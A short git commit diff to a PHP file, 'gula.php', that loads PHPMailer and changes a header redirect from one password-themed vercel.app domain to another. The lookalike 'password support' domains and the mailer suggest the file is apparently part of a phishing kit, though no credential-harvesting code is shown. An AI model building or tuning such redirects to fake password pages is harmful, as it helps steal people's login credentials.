cd1cf243e34fcb475a8a5494e79034938bfecd18
henyyjonyy <henyyjonyy@gmail.com>
2025-08-20 23:59:17 -0700

    Update gula.php

--- gula.php
+++ gula.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://g-aprove-password.vercel.app/");
+header("Location: https://password-g-support.vercel.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
